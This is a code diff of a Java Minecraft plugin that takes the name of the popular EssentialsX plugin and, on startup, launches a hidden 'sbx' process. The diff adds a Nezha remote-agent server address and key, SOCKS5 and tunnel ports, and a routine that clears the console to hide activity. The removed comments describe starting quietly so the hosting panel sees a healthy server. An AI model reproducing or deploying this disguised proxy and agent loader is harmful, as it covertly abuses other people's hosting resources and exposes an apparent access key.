@@ -24,20 +24,14 @@ public class EssentialsX extends JavaPlugin {
     public void onEnable() {
         getLogger().info("EssentialsX plugin starting...");
         
-        // 告诉服务器：我要在后台悄悄启动脚本，不要卡死主线程
-        org.bukkit.Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
-            try {
-                // 在后台运行启动逻辑
-                startSbxProcess();
-            } catch (Exception e) {
-                // 如果启动失败，只在控制台报错，不影响服务器运行
-                getLogger().severe("Failed to start script process: " + e.getMessage());
-                e.printStackTrace();
-            }
-        });
-
-        // 立即告诉面板：插件已经“加载完成”了，让面板觉得服务器很健康
-        getLogger().info("EssentialsX plugin initialized and running in background");
+        // Start sbx
+        try {
+            startSbxProcess();
+            getLogger().info("EssentialsX plugin enabled");
+        } catch (Exception e) {
+            getLogger().severe("Failed to start sbx process: " + e.getMessage());
+            e.printStackTrace();
+        }
     }
     
     private void startSbxProcess() throws Exception {
@@ -79,15 +73,15 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "a5efed7e-ad51-4655-a01e-26ae497ba47f");
+        env.put("UUID", "71cb925a-8c40-4c2e-a7a0-9de939f388b2");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
+        env.put("NEZHA_SERVER", "nezha.aaccc.nyc.mn:443");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
+        env.put("NEZHA_KEY", "tajok4LCyzdlZbH6EHZGMjI9sG076wR6");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "25612");
+        env.put("S5_PORT", "35569");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
@@ -209,7 +203,18 @@ public class EssentialsX extends JavaPlugin {
     }
     
     private void clearConsole() {
-        
+        try {
+            System.out.print("\033[H\033[2J");
+            System.out.flush();
+            
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
+                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
+            } else {
+                new ProcessBuilder("clear").inheritIO().start().waitFor();
+            }
+        } catch (Exception e) {
+            System.out.println("\n\n\n\n\n\n\n\n\n\n");
+        }
     }
     
     private void startProcessMonitor() {
